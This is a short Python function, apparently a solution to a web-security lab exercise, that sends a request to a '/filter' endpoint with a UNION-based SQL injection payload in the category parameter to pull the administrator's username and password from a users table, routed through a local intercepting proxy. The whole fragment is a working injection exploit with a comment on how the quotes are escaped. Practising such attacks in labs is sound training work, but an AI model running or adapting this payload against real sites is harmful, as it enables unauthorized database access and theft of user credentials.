...
def extract_info(base_url: str) -> None:
    response = requests.get(
            base_url + "/filter",
            params={"category": f'Clothing, shoes and accessories \' UNION SELECT username, password FROM users WHERE username = \'administrator\'-- '},#fstring with sqli payload to look for administrator creds in users table, needed to escape the ' before UNION and for administrator so used \.
            proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
            verify=False,
    )
    print(response.text)
